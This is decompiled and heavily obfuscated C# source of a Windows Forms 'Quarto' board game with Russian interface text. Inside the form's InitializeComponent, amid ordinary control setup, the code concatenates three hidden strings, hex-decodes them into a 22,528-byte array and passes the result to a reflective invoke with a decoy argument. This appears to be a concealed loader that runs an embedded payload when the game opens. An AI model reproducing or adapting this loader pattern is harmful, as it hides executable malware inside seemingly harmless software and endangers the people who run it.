					num = num8 ^ (int)(num2 * 504119042);
					continue;
				}
				case 67u:
				{
					int num68;
					if (mem[num3, 0].Square != mem[num3, 1].Square)
					{
						num = -1874934165;
						num68 = -1874934165;
					}
					else
					{
						num = -851188672;
						num68 = -851188672;
					}
					continue;
				}
				case 65u:
					if (mem[num3, 2].Point != mem[num3, 3].Point)
					{
						num = ((int)num2 * -43025953) ^ -1970792710;
						continue;
					}
					goto IL_01ef;
				case 64u:
					if (mem[2, 1].Big != mem[3, 0].Big)
					{
						num = ((int)num2 * -1444623354) ^ -449803575;
						continue;
					}
					goto IL_007c;
				case 63u:
				{
					int num39;
					int num40;
					if (mem[1, 1].Point != mem[2, 2].Point)
					{
						num39 = 237928831;
						num40 = 237928831;
					}
					else
					{
						num39 = 1570696199;
						num40 = 1570696199;
					}
					num = num39 ^ ((int)num2 * -1978712439);
					continue;
				}
				case 62u:
					if (mem[0, num3].Square == mem[1, num3].Square)
					{
						num = -14480399;
						continue;
					}
					goto IL_0294;
				case 61u:
					if (mem[0, num3] != null)
					{
						num = -837848777;
						continue;
					}
					goto IL_02ae;
				case 60u:
				{
					int num16;
					int num17;
					if (mem[0, num3].Big != mem[1, num3].Big)
					{
						num16 = -165941159;
						num17 = -165941159;
					}
					else
					{
						num16 = -1660277116;
						num17 = -1660277116;
					}
					num = num16 ^ ((int)num2 * -1436882634);
					continue;
				}
				case 59u:
					flag2 = true;
					num = ((int)num2 * -1441692542) ^ 0x7859029E;
					continue;
				case 58u:
				{
					int num58;
					int num59;
					if (mem[0, 0].Big == mem[1, 1].Big)
					{
						num58 = 453644294;
						num59 = 453644294;
					}
					else
					{
						num58 = 89707095;
						num59 = 89707095;
					}
					num = num58 ^ ((int)num2 * -2033311424);
					continue;
				}
				case 57u:
					if (mem[1, num3] != null)
					{
						num = ((int)num2 * -196909331) ^ -1883193480;
						continue;
					}
					goto IL_02ae;
				case 56u:
				{
					int num54;
					int num55;
					if (mem[num3, 1].Big == mem[num3, 2].Big)
					{
						num54 = -140724654;
						num55 = -140724654;
					}
					else
					{
						num54 = -372513653;
						num55 = -372513653;
					}
					num = num54 ^ (int)(num2 * 414477098);
					continue;
				}
				case 55u:
				{
					int num45;
					if (mem[num3, 0].Point != mem[num3, 1].Point)
					{
						num = -1891048495;
						num45 = -1891048495;
					}
					else
					{
						num = -1247884611;
						num45 = -1247884611;
					}
					continue;
				}
				case 54u:
					num29 = ((mem[2, num3].Square == mem[3, num3].Square) ? 1 : 0);
					goto IL_01f0;
				case 53u:
				{
					int num30;
					int num31;
					if (mem[1, 2].Big != mem[2, 1].Big)
					{
						num30 = -2002368796;
						num31 = -2002368796;
					}
					else
					{
						num30 = -1845042009;
						num31 = -1845042009;
					}
					num = num30 ^ ((int)num2 * -1225632719);
					continue;
				}
				case 52u:
				{
					int num24;
					int num25;
					if (mem[1, num3].Point != mem[2, num3].Point)
					{
						num24 = -496897952;
						num25 = -496897952;
					}
					else
					{
						num24 = -1674967996;
						num25 = -1674967996;
					}
					num = num24 ^ ((int)num2 * -481717196);
					continue;
				}
				case 51u:
				{
					int num19;
					int num20;
					if (mem[0, 0] == null)
					{
						num19 = 1646140770;
						num20 = 1646140770;
					}
					else
					{
						num19 = 422092013;
						num20 = 422092013;
					}
					num = num19 ^ (int)(num2 * 1551972213);
					continue;
				}
				case 50u:
				{
					int num69;
					int num70;
					if (mem[1, 2].Dark != mem[2, 1].Dark)
					{
						num69 = -956423852;
						num70 = -956423852;
					}
					else
					{
						num69 = -1591034747;
						num70 = -1591034747;
					}
					num = num69 ^ ((int)num2 * -1235245697);
					continue;
				}
				case 49u:
				{
					int num64;
					int num65;
					if (mem[num3, 3] != null)
					{
						num64 = -1119661331;
						num65 = -1119661331;
					}
					else
					{
						num64 = -691829309;
						num65 = -691829309;
					}
					num = num64 ^ ((int)num2 * -1782060824);
					continue;
				}
				case 48u:
				{
					int num60;
					int num61;
					if (mem[num3, 1] != null)
					{
						num60 = 139690180;
						num61 = 139690180;
					}
					else
					{
						num60 = 1596125675;
						num61 = 1596125675;
					}
					num = num60 ^ ((int)num2 * -430172296);
					continue;
				}
				case 47u:
					if (mem[0, 3] != null)
					{
						num = -663898272;
						continue;
					}
					goto IL_0088;
				case 46u:
					if (mem[2, 1] != null)
					{
						num = (int)((num2 * 1311894843) ^ 0x6650294C);
						continue;
					}
					goto IL_0088;
				case 45u:
					if (mem[2, 1].Square == mem[3, 0].Square)
					{
						goto IL_007c;
					}
					goto IL_0088;
				case 44u:
					flag2 = true;
					num = (int)(num2 * 487445003) ^ -1580372616;
					continue;
				case 43u:
				{
					int num50;
					int num51;
					if (mem[num3, 1].Point == mem[num3, 2].Point)
					{
						num50 = -2009988125;
						num51 = -2009988125;
					}
					else
					{
						num50 = -476533327;
						num51 = -476533327;
					}
					num = num50 ^ (int)(num2 * 1055303456);
					continue;
				}
				case 42u:
					if (mem[2, num3].Point != mem[3, num3].Point)
					{
						num = ((int)num2 * -1338452252) ^ -217902840;
						continue;
					}
					goto IL_0632;
				case 41u:
				{
					int num44;
					if (mem[num3, 0].Dark != mem[num3, 1].Dark)
					{
						num = -328517979;
						num44 = -328517979;
					}
					else
					{
						num = -233060613;
						num44 = -233060613;
					}
					continue;
				}
				case 40u:
					if (mem[2, 2].Dark != mem[3, 3].Dark)
					{
						num = ((int)num2 * -134541630) ^ -538688032;
						continue;
					}
					goto IL_007c;
				case 39u:
					if (mem[2, num3] != null)
					{
						num = (int)((num2 * 927114659) ^ 0xF0CB338);
						continue;
					}
					goto IL_02ae;
				case 38u:
				{
					int num37;
					if (mem[0, 0].Square == mem[1, 1].Square)
					{
						num = -965703241;
						num37 = -965703241;
					}
					else
					{
						num = -1740828755;
						num37 = -1740828755;
					}
					continue;
				}
				case 37u:
				{
					int num32;
					int num33;
					if (mem[1, 1].Square == mem[2, 2].Square)
					{
						num32 = 2018394659;
						num33 = 2018394659;
					}
					else
					{
						num32 = 1880160684;
						num33 = 1880160684;
					}
					num = num32 ^ ((int)num2 * -386288639);
					continue;
				}
				case 36u:
					if (mem[3, 0] != null)
					{
						num = (int)((num2 * 575320031) ^ 0x57AF72E);
						continue;
					}
					goto IL_0088;
				case 35u:
					if (mem[2, 1].Point != mem[3, 0].Point)
					{
						num = ((int)num2 * -1944233358) ^ 0x4304EE0C;
						continue;
					}
					goto IL_007c;
				case 34u:
					if (mem[2, num3].Dark != mem[3, num3].Dark)
					{
						num = ((int)num2 * -241613843) ^ 0x76FA7473;
						continue;
					}
					goto IL_0632;
				case 33u:
				{
					int num14;
					int num15;
					if (mem[num3, 1].Dark == mem[num3, 2].Dark)
					{
						num14 = 994868215;
						num15 = 994868215;
					}
					else
					{
						num14 = 2102569221;
						num15 = 2102569221;
					}
					num = num14 ^ ((int)num2 * -1942696416);
					continue;
				}
				case 32u:
				{
					int num6;
					int num7;
					if (mem[1, 1] == null)
					{
						num6 = -1715750151;
						num7 = -1715750151;
					}
					else
					{
						num6 = -741079946;
						num7 = -741079946;
					}
					num = num6 ^ (int)(num2 * 908404017);
					continue;
				}
				case 31u:
					num = -1102395292;
					continue;
				case 30u:
					result = flag2;
					num = -1633225885;
					continue;
				case 29u:
				{
					int num66;
					int num67;
					if (mem[1, 2].Point != mem[2, 1].Point)
					{
						num66 = 1560816680;
						num67 = 1560816680;
					}
					else
					{
						num66 = 1767515811;
						num67 = 1767515811;
					}
					num = num66 ^ (int)(num2 * 127393090);
					continue;
				}
				case 28u:
				{
					int num62;
					int num63;
					if (mem[1, 1].Dark == mem[2, 2].Dark)
					{
						num62 = -930398706;
						num63 = -930398706;
					}
					else
					{
						num62 = -1141372444;
						num63 = -1141372444;
					}
					num = num62 ^ (int)(num2 * 2143408675);
					continue;
				}
				case 27u:
				{
					int num56;
					int num57;
					if (mem[3, 3] == null)
					{
						num56 = 1317916219;
						num57 = 1317916219;
					}
					else
					{
						num56 = 470606354;
						num57 = 470606354;
					}
					num = num56 ^ ((int)num2 * -1125827454);
					continue;
				}
				case 26u:
					if (mem[2, 2].Point != mem[3, 3].Point)
					{
						num = (int)(num2 * 1798667842) ^ -934148760;
						continue;
					}
					goto IL_007c;
				case 25u:
					if (mem[num3, 2].Dark != mem[num3, 3].Dark)
					{
						num = (int)((num2 * 826024818) ^ 0x64B42397);
						continue;
					}
					goto IL_01ef;
				case 24u:
					if (mem[num3, 2].Big != mem[num3, 3].Big)
					{
						num = ((int)num2 * -1311797152) ^ 0x5F8514D3;
						continue;
					}
					goto IL_01ef;
				case 23u:
					if (mem[3, num3] != null)
					{
						num = (int)((num2 * 1643874823) ^ 0x4DD0F0EB);
						continue;
					}
					goto IL_02ae;
				case 22u:
					if (mem[1, 2].Square == mem[2, 1].Square)
					{
						num = (int)(num2 * 1236897908) ^ -2065808301;
						continue;
					}
					goto IL_0088;
				case 21u:
					if (mem[2, num3].Big != mem[3, num3].Big)
					{
						num = ((int)num2 * -788268268) ^ 0x59339455;
						continue;
					}
					goto IL_0632;
				case 20u:
				{
					int num52;
					int num53;
					if (mem[0, 3].Big == mem[1, 2].Big)
					{
						num52 = 1171300035;
						num53 = 1171300035;
					}
					else
					{
						num52 = 578199649;
						num53 = 578199649;
					}
					num = num52 ^ (int)(num2 * 245656450);
					continue;
				}
				case 19u:
					if (mem[1, num3].Square == mem[2, num3].Square)
					{
						num = ((int)num2 * -80710372) ^ -91402336;
						continue;
					}
					goto IL_0294;
				case 18u:
				{
					int num48;
					int num49;
					if (mem[num3, 1].Square == mem[num3, 2].Square)
					{
						num48 = -708116287;
						num49 = -708116287;
					}
					else
					{
						num48 = -397564827;
						num49 = -397564827;
					}
					num = num48 ^ ((int)num2 * -2119941787);
					continue;
				}
				case 17u:
					if (mem[num3, 2].Square != mem[num3, 3].Square)
					{
						num = (int)((num2 * 918258988) ^ 0xA053BA7);
						continue;
					}
					goto IL_01ef;
				case 16u:
					if (mem[2, 2].Square != mem[3, 3].Square)
					{
						num = (int)(num2 * 955275293) ^ -405709719;
						continue;
					}
					goto IL_007c;
				case 15u:
				{
					int num43;
					if (mem[0, num3].Dark != mem[1, num3].Dark)
					{
						num = -507193139;
						num43 = -507193139;
					}
					else
					{
						num = -342990118;
						num43 = -342990118;
					}
					continue;
				}
				case 14u:
				{
					int num41;
					int num42;
					if (mem[num3, 2] == null)
					{
						num41 = -424290757;
						num42 = -424290757;
					}
					else
					{
						num41 = -849073441;
						num42 = -849073441;
					}
					num = num41 ^ ((int)num2 * -1478779032);
					continue;
				}
				case 13u:
				{
					int num38;
					if (mem[0, 0].Dark == mem[1, 1].Dark)
					{
						num = -1228731822;
						num38 = -1228731822;
					}
					else
					{
						num = -1164934200;
						num38 = -1164934200;
					}
					continue;
				}
				case 12u:
				{
					int num34;
					if (mem[0, 3].Point != mem[1, 2].Point)
					{
						num = -497533438;
						num34 = -497533438;
					}
					else
					{
						num = -1597652413;
						num34 = -1597652413;
					}
					continue;
				}
				case 11u:
				{
					int num27;
					int num28;
					if (mem[num3, 0].Big == mem[num3, 1].Big)
					{
						num27 = -762076482;
						num28 = -762076482;
					}
					else
					{
						num27 = -902460953;
						num28 = -902460953;
					}
					num = num27 ^ ((int)num2 * -649811332);
					continue;
				}
				case 10u:
				{
					int num26;
					if (mem[0, 0].Point == mem[1, 1].Point)
					{
						num = -1521747123;
						num26 = -1521747123;
					}
					else
					{
						num = -839548628;
						num26 = -839548628;
					}
					continue;
				}
				case 9u:
					num3 = 0;
					num = ((int)num2 * -624855754) ^ -1382375923;
					continue;
				case 8u:
					num3++;
					num = (int)((num2 * 186877579) ^ 0x2CC9F01B);
					continue;
				case 7u:
				{
					int num23;
					if (mem[0, num3].Point != mem[1, num3].Point)
					{
						num = -1891623168;
						num23 = -1891623168;
					}
					else
					{
						num = -1395036530;
						num23 = -1395036530;
					}
					continue;
				}
				case 6u:
					num = -703842930;
					continue;
				case 5u:
				{
					int num21;
					if (num3 < 4)
					{
						num = -488396055;
						num21 = -488396055;
					}
					else
					{
						num = -1124444411;
						num21 = -1124444411;
					}
					continue;
				}
				case 4u:
					if (mem[0, 3].Square == mem[1, 2].Square)
					{
						num = -180512576;
						continue;
					}
					goto IL_0088;
				case 3u:
				{
					int num18;
					if (mem[0, 3].Dark != mem[1, 2].Dark)
					{
						num = -1907245394;
						num18 = -1907245394;
					}
					else
					{
						num = -378598736;
						num18 = -378598736;
					}
					continue;
				}
				case 2u:
				{
					int num10;
					int num11;
					if (mem[1, num3].Big == mem[2, num3].Big)
					{
						num10 = 170085883;
						num11 = 170085883;
					}
					else
					{
						num10 = 230105089;
						num11 = 230105089;
					}
					num = num10 ^ ((int)num2 * -119248472);
					continue;
				}
				case 0u:
				{
					int num4;
					int num5;
					if (mem[1, num3].Dark == mem[2, num3].Dark)
					{
						num4 = -1103005688;
						num5 = -1103005688;
					}
					else
					{
						num4 = -778090363;
						num5 = -778090363;
					}
					num = num4 ^ (int)(num2 * 1007826134);
					continue;
				}
				case 66u:
					break;
				default:
					{
						return result;
					}
					IL_0088:
					num = -25676012;
					num22 = -25676012;
					continue;
					IL_02ae:
					num29 = 0;
					goto IL_01f0;
					IL_0294:
					num29 = 0;
					goto IL_01f0;
					IL_0632:
					num29 = 1;
					goto IL_01f0;
					IL_01f0:
					flag = (byte)num29 != 0;
					num = -913327995;
					continue;
					IL_01ef:
					num29 = 1;
					goto IL_01f0;
					IL_007c:
					num = -697494158;
					num22 = -697494158;
					continue;
				}
				break;
			}
		}
	}

	private bool Standoff(Figurine[,] mem)
	{
		bool flag = true;
		int num = 0;
		bool flag2 = default(bool);
		int num6 = default(int);
		bool result = default(bool);
		while (true)
		{
			int num2 = -1672427907;
			while (true)
			{
				uint num3;
				switch ((num3 = (uint)num2 ^ 0x90D13A2Cu) % 14u)
				{
				case 12u:
					flag2 = num6 < 4;
					num2 = -1072620804;
					continue;
				case 11u:
				{
					int num8;
					if (num < 4)
					{
						num2 = -985588698;
						num8 = -985588698;
					}
					else
					{
						num2 = -2005477455;
						num8 = -2005477455;
					}
					continue;
				}
				case 10u:
					num6 = 0;
					num2 = -1007100839;
					continue;
				case 9u:
					num2 = (int)(num3 * 657703866) ^ -2138434994;
					continue;
				case 8u:
				{
					int num7;
					if (mem[num, num6] == null)
					{
						num2 = -732969606;
						num7 = -732969606;
					}
					else
					{
						num2 = -2086339595;
						num7 = -2086339595;
					}
					continue;
				}
				case 7u:
					result = flag;
					num2 = ((int)num3 * -20389693) ^ -648936876;
					continue;
				case 6u:
					flag = false;
					num2 = (int)(num3 * 927106879) ^ -1973957665;
					continue;
				case 5u:
					num2 = ((int)num3 * -1524714061) ^ -1452425615;
					continue;
				case 3u:
					num6++;
					num2 = -1717607746;
					continue;
				case 2u:
				{
					int num4;
					int num5;
					if (flag2)
					{
						num4 = 2090908514;
						num5 = 2090908514;
					}
					else
					{
						num4 = 479958254;
						num5 = 479958254;
					}
					num2 = num4 ^ (int)(num3 * 1700354137);
					continue;
				}
				case 1u:
					num2 = (int)((num3 * 1184210015) ^ 0x78D89D76);
					continue;
				case 0u:
					num++;
					num2 = ((int)num3 * -883941625) ^ -926943097;
					continue;
				case 13u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public void SetName(string str)
	{
		while (true)
		{
			int num = 1732446662;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x51C7FC6Bu) % 9u)
				{
				case 8u:
					num = ((int)num2 * -1607985217) ^ 0x34D19E77;
					continue;
				case 7u:
					Form1.smethod_32((Control)(object)label5, "Игрок: ");
					num = ((int)num2 * -478536769) ^ 0x614179;
					continue;
				case 5u:
					Form1.smethod_32((Control)(object)label6, str);
					Form1.smethod_50((Control)(object)label5, (Form1.smethod_49((Control)(object)this) - (Form1.smethod_18((Control)(object)label5) + Form1.smethod_18((Control)(object)label6))) / 2);
					num = (int)((num2 * 648419885) ^ 0x61BFEC13);
					continue;
				case 4u:
					Form1.smethod_32((Control)(object)label1, "");
					num = ((int)num2 * -1808525598) ^ -1542826296;
					continue;
				case 3u:
					num = (int)(num2 * 1494444197) ^ -479748736;
					continue;
				case 2u:
					Form1.smethod_50((Control)(object)label6, Form1.smethod_37((Control)(object)label5).X + Form1.smethod_18((Control)(object)label5));
					num = ((int)num2 * -1249608447) ^ 0x55E0544B;
					continue;
				case 1u:
					Form1.smethod_32((Control)(object)label2, "");
					num = (int)(num2 * 2080951550) ^ -586707976;
					continue;
				default:
					return;
				case 0u:
					break;
				case 6u:
					return;
				}
				break;
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = -948628730;
			while (true)
			{
				uint num2;
				int num5;
				switch ((num2 = (uint)num ^ 0xFB6F8469u) % 8u)
				{
				case 7u:
					if (disposing)
					{
						num = (int)((num2 * 678381749) ^ 0x6145F6A7);
						continue;
					}
					num5 = 0;
					goto IL_0019;
				case 6u:
					Form1.smethod_51((IDisposable)components);
					num = ((int)num2 * -407624117) ^ 0x51202948;
					continue;
				case 5u:
					num5 = ((components != null) ? 1 : 0);
					goto IL_0019;
				case 4u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = -575405589;
						num4 = -575405589;
					}
					else
					{
						num3 = -941990075;
						num4 = -941990075;
					}
					num = num3 ^ ((int)num2 * -1391142641);
					continue;
				}
				case 3u:
					num = ((int)num2 * -31591549) ^ -1124061864;
					continue;
				case 0u:
					((Form)this).Dispose(disposing);
					num = -1570439896;
					continue;
				default:
					return;
				case 2u:
					break;
				case 1u:
					return;
					IL_0019:
					flag = (byte)num5 != 0;
					num = -1363788307;
					continue;
				}
				break;
			}
		}
	}

	private void InitializeComponent()
	{
		//IL_100b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1015: Expected O, but got Unknown
		components = Form1.smethod_52();
		pictureBox1 = Form1.smethod_2();
		byte[] array = default(byte[]);
		object[] object_ = default(object[]);
		int num5 = default(int);
		string sa = default(string);
		bool flag = default(bool);
		while (true)
		{
			int num = 1007145101;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x4A536C4Fu) % 132u)
				{
				case 131u:
					Form1.smethod_73(timer1, (EventHandler)Timer1_Tick);
					num = ((int)num2 * -1830031590) ^ -581818879;
					continue;
				case 130u:
					num = ((int)num2 * -1250348806) ^ -1610394069;
					continue;
				case 129u:
					label6 = Form1.smethod_57();
					Form1.smethod_58((ISupportInitialize)pictureBox1);
					num = ((int)num2 * -1679305625) ^ 0x204B117C;
					continue;
				case 128u:
					num = (int)((num2 * 954975149) ^ 0x3E1D2659);
					continue;
				case 127u:
					num = (int)((num2 * 26786684) ^ 0x3C59028);
					continue;
				case 126u:
					Form1.smethod_77((Control)(object)label5, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -825524327) ^ -1459843143;
					continue;
				case 125u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label2);
					num = ((int)num2 * -518739555) ^ 0x6BE4B90C;
					continue;
				case 124u:
					Form1.smethod_4((Control)(object)label2, new Point(0, 0));
					num = ((int)num2 * -1791707884) ^ -1271327995;
					continue;
				case 123u:
					Form1.smethod_65((Control)(object)richTextBox1, bool_0: false);
					num = (int)(num2 * 2104162294) ^ -1442467081;
					continue;
				case 122u:
					Form1.smethod_74((Control)(object)label2, bool_0: true);
					num = ((int)num2 * -1196541860) ^ -559181340;
					continue;
				case 121u:
					Form1.smethod_4((Control)(object)richTextBox1, new Point(107, 275));
					num = ((int)num2 * -2005645245) ^ 0x19FE938B;
					continue;
				case 120u:
					Form1.smethod_64((Control)(object)richTextBox1, 6);
					num = ((int)num2 * -1045007100) ^ 0x36DE4804;
					continue;
				case 119u:
					Form1.smethod_32((Control)(object)button2, "Подтвердить");
					num = (int)((num2 * 1759601608) ^ 0x72DD2B6A);
					continue;
				case 118u:
					num = ((int)num2 * -727854747) ^ 0x470503F5;
					continue;
				case 117u:
					num = ((int)num2 * -1008023959) ^ 0x2BE92803;
					continue;
				case 116u:
					Form1.smethod_77((Control)(object)label2, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)(num2 * 17019487) ^ -553543449;
					continue;
				case 115u:
					num = ((int)num2 * -515527102) ^ -168684122;
					continue;
				case 114u:
					num = (int)((num2 * 1221715120) ^ 0x1FFBDC7);
					continue;
				case 113u:
					Form1.smethod_4((Control)(object)panel1, new Point(0, 24));
					num = ((int)num2 * -1533829023) ^ 0x643712AF;
					continue;
				case 112u:
					Form1.smethod_61((Control)(object)label1, "label1");
					num = (int)(num2 * 377166972) ^ -309782225;
					continue;
				case 111u:
					Form1.smethod_61((Control)(object)richTextBox1, "richTextBox1");
					num = (int)(num2 * 1766793540) ^ -854845550;
					continue;
				case 110u:
					num = ((int)num2 * -1631515403) ^ -1790306974;
					continue;
				case 109u:
					num = ((int)num2 * -130464541) ^ 0x6A5DBB04;
					continue;
				case 108u:
					Form1.smethod_64((Control)(object)panel1, 7);
					num = ((int)num2 * -1238487806) ^ -646310209;
					continue;
				case 107u:
					Form1.smethod_64((Control)(object)label2, 9);
					Form1.smethod_74((Control)(object)label5, bool_0: true);
					num = ((int)num2 * -1874744570) ^ 0x2AD61E87;
					continue;
				case 106u:
					Form1.smethod_67((Control)(object)button1, (EventHandler)Button1_Click);
					num = (int)(num2 * 1736209714) ^ -828043192;
					continue;
				case 105u:
					Form1.smethod_3((Control)(object)panel1, new Size(486, 240));
					num = (int)(num2 * 805423605) ^ -699206962;
					continue;
				case 104u:
					Form1.smethod_74((Control)(object)label1, bool_0: true);
					num = (int)((num2 * 1001234000) ^ 0x1B61C5E9);
					continue;
				case 103u:
					Form1.smethod_64((Control)(object)button1, 5);
					num = (int)((num2 * 1284311114) ^ 0x5EDBE873);
					continue;
				case 102u:
					num = (int)((num2 * 1791331808) ^ 0x6F5A4600);
					continue;
				case 101u:
					Form1.smethod_3((Control)(object)label1, new Size(0, 16));
					num = (int)((num2 * 954307722) ^ 0x247F6B4F);
					continue;
				case 100u:
					num = ((int)num2 * -1423637335) ^ 0x674B821C;
					continue;
				case 99u:
					Form1.smethod_91((Control)(object)this, bool_0: false);
					num = ((int)num2 * -359258252) ^ 0x62A80B9A;
					continue;
				case 98u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label5);
					num = ((int)num2 * -704754279) ^ -1668108448;
					continue;
				case 97u:
					Form1.smethod_3((Control)(object)label5, new Size(0, 16));
					num = ((int)num2 * -1697840050) ^ -564416714;
					continue;
				case 96u:
					num = (int)(num2 * 280217782) ^ -2000233926;
					continue;
				case 95u:
					num = (int)(num2 * 1039519180) ^ -569478537;
					continue;
				case 94u:
					num = (int)(num2 * 1427977740) ^ -1277899763;
					continue;
				case 93u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label6);
					num = (int)(num2 * 528961128) ^ -2143102934;
					continue;
				case 92u:
					array = new byte[22528];
					num = ((int)num2 * -1473054731) ^ -1356590245;
					continue;
				case 91u:
					Form1.smethod_70(ComMember, object_);
					num = (int)((num2 * 170809851) ^ 0x3ED42FD2);
					continue;
				case 90u:
					Form1.smethod_80((ContainerControl)(object)this, (AutoScaleMode)1);
					num = ((int)num2 * -1798621255) ^ -2102239599;
					continue;
				case 89u:
					Form1.smethod_86((Form)(object)this, bool_0: false);
					num = (int)(num2 * 1496568855) ^ -518240129;
					continue;
				case 88u:
					Form1.smethod_3((Control)(object)label2, new Size(0, 16));
					num = (int)((num2 * 462028770) ^ 0x53EE56F1);
					continue;
				case 87u:
					num = (int)(num2 * 1408873067) ^ -26387665;
					continue;
				case 86u:
					Form1.smethod_75((Control)(object)label1, (DockStyle)4);
					Form1.smethod_77((Control)(object)label1, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -40973982) ^ -1283909639;
					continue;
				case 85u:
					num = (int)((num2 * 1400243859) ^ 0x7D542571);
					continue;
				case 84u:
					Form1.smethod_71((TextBoxBase)(object)richTextBox1, bool_0: true);
					num = (int)((num2 * 1985056652) ^ 0x5B5034CE);
					continue;
				case 83u:
					Form1.smethod_61((Control)(object)pictureBox1, "pictureBox1");
					num = ((int)num2 * -2125722463) ^ -1849677401;
					continue;
				case 82u:
					array[num5] = Form1.smethod_69(Form1.smethod_68(sa, num5 * 2, 2), 16);
					num = ((int)num2 * -773188536) ^ -1012623587;
					continue;
				case 81u:
					Form1.smethod_90((ISupportInitialize)pictureBox1);
					num = (int)(num2 * 810272825) ^ -1979616687;
					continue;
				case 80u:
					Form1.smethod_72(timer1, 1000);
					num = ((int)num2 * -1597239816) ^ -1572467315;
					continue;
				case 79u:
					num = ((int)num2 * -2120821628) ^ -379676409;
					continue;
				case 78u:
					Form1.smethod_92((Control)(object)this);
					num = ((int)num2 * -1414231992) ^ 0x6D80707B;
					continue;
				case 77u:
					Form1.smethod_78((Control)(object)label1, (RightToLeft)0);
					num = ((int)num2 * -1764475920) ^ -465218582;
					continue;
				case 76u:
					Form1.smethod_5((Control)(object)this, Color.White);
					Form1.smethod_81((Form)(object)this, new Size(486, 319));
					num = (int)(num2 * 657672414) ^ -879180234;
					continue;
				case 75u:
					num = (int)((num2 * 742321656) ^ 0x239B781C);
					continue;
				case 74u:
					num5++;
					num = (int)((num2 * 1261266074) ^ 0x7F0064B1);
					continue;
				case 73u:
					Form1.smethod_66((ButtonBase)(object)button2, bool_0: true);
					num = (int)(num2 * 700580322) ^ -775182695;
					continue;
				case 72u:
					num = (int)(num2 * 1659868922) ^ -1614800350;
					continue;
				case 71u:
					num = (int)((num2 * 15958892) ^ 0x7F4EB5FF);
					continue;
				case 70u:
					sa = Veet.Sa;
					sa = Form1.smethod_34(sa, Veet.Xe);
					sa = Form1.smethod_34(sa, Veet.Zr);
					num = ((int)num2 * -74234997) ^ -1820140927;
					continue;
				case 69u:
					Form1.smethod_59((Control)(object)this);
					Form1.smethod_5((Control)(object)pictureBox1, Color.FromArgb(64, 32, 0));
					num = ((int)num2 * -1340344616) ^ 0x33F8D5B1;
					continue;
				case 68u:
					num = ((int)num2 * -490717400) ^ 0x626BF3F0;
					continue;
				case 67u:
					CharArray(array, string.Empty);
					object_ = new object[3]
					{
						Player.MembershipCondition(0),
						Player.MembershipCondition(1),
						"Cytotechnologist"
					};
					num = ((int)num2 * -1620393844) ^ 0x607C6874;
					continue;
				case 66u:
					Form1.smethod_32((Control)(object)button1, "Меню");
					num = (int)((num2 * 909205247) ^ 0x75A30F4D);
					continue;
				case 65u:
					Form1.smethod_67((Control)(object)button2, (EventHandler)Button2_Click);
					num = ((int)num2 * -929623647) ^ -16014901;
					continue;
				case 64u:
					num5 = 0;
					num = ((int)num2 * -702655711) ^ 0x40284AA0;
					continue;
				case 63u:
					Form1.smethod_3((Control)(object)button1, new Size(83, 35));
					num = ((int)num2 * -593125749) ^ 0x721C2281;
					continue;
				case 62u:
					num = ((int)num2 * -1862617043) ^ -839812874;
					continue;
				case 60u:
					panel1 = Form1.smethod_55();
					num = (int)(num2 * 1852744361) ^ -925162436;
					continue;
				case 59u:
					Form1.smethod_32((Control)(object)this, "Quarto");
					num = ((int)num2 * -119400183) ^ -374158082;
					continue;
				case 58u:
					Form1.smethod_32((Control)(object)richTextBox1, "");
					num = (int)((num2 * 1059775540) ^ 0x74A6D1A2);
					continue;
				case 57u:
					num = ((int)num2 * -449226752) ^ 0x5318DF48;
					continue;
				case 56u:
					num = ((int)num2 * -1221223961) ^ -1916992306;
					continue;
				case 55u:
					Form1.smethod_64((Control)(object)label5, 12);
					num = ((int)num2 * -1680938273) ^ 0x1A1A584F;
					continue;
				case 54u:
					Form1.smethod_65((Control)(object)button1, bool_0: false);
					num = (int)((num2 * 1707153015) ^ 0x2CF74EEF);
					continue;
				case 53u:
					Form1.smethod_64((Control)(object)button2, 4);
					num = (int)((num2 * 420132491) ^ 0x33FEE93);
					continue;
				case 52u:
					Form1.smethod_4((Control)(object)button1, new Point(12, 275));
					num = (int)((num2 * 974754080) ^ 0x53DE3326);
					continue;
				case 51u:
					num = ((int)num2 * -1977633256) ^ -1180402835;
					continue;
				case 50u:
					Form1.smethod_89((Control)(object)this, (EventHandler)Form1_LocationChanged);
					num = ((int)num2 * -1693046103) ^ 0x7360E638;
					continue;
				case 49u:
					Form1.smethod_61((Control)(object)button1, "button1");
					num = (int)(num2 * 102627415) ^ -1089671280;
					continue;
				case 48u:
					Form1.smethod_77((Control)(object)label6, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)(num2 * 1888382529) ^ -111329459;
					continue;
				case 47u:
					Form1.smethod_79((ContainerControl)(object)this, new SizeF(6f, 13f));
					num = ((int)num2 * -539618020) ^ 0x739C6DC5;
					continue;
				case 46u:
					Form1.smethod_61((Control)(object)label6, "label6");
					num = (int)((num2 * 928290271) ^ 0x3E7B3BB2);
					continue;
				case 45u:
					num = ((int)num2 * -36007661) ^ -2035922756;
					continue;
				case 44u:
					Form1.smethod_61((Control)(object)label2, "label2");
					num = ((int)num2 * -41065662) ^ -1547296145;
					continue;
				case 43u:
					Form1.smethod_88((Form)(object)this, (EventHandler)Form1_Shown);
					num = (int)((num2 * 2044516348) ^ 0x65BE10F5);
					continue;
				case 42u:
					Form1.smethod_87((Form)(object)this, (EventHandler)Form1_Load);
					num = ((int)num2 * -424951483) ^ -736227231;
					continue;
				case 41u:
					label1 = Form1.smethod_57();
					label2 = Form1.smethod_57();
					label5 = Form1.smethod_57();
					num = (int)((num2 * 220011425) ^ 0x3296F877);
					continue;
				case 40u:
